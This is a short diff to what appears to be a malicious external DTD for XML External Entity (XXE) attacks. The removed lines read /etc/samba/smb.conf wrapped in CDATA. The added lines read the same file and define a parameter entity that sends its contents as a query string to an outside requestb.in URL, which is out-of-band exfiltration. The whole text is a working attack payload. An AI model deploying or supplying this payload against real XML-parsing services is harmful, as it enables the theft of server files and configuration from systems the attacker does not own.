@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/samba/smb.conf">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % data SYSTEM "file:///etc/samba/smb.conf">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://requestb.in/17vowyr1?data=%data;'>">
